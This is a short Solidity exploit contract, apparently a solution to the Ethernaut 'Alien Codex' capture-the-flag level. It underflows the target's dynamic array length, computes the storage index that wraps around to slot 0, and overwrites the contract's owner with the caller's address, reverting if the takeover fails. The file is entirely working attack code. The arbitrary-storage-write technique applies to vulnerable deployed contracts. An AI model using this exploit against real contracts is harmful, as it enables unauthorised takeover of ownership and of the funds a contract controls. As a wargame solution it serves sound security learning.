// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IAlienCodex {
    function owner() external view returns (address);
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodexHack {
    error HackFailed();

    IAlienCodex private immutable TARGET;

    constructor(address _target) {
        TARGET = IAlienCodex(_target);
        TARGET.makeContact();
        TARGET.retract();
        uint256 arrayLengthSlot = uint256(keccak256(abi.encode(uint256(1))));
        uint256 ownerSlot;
        unchecked {
            ownerSlot -= arrayLengthSlot;
        }
        TARGET.revise(ownerSlot, bytes32(uint256(uint160(msg.sender))));
        if (TARGET.owner() != msg.sender) revert HackFailed();
    }
}
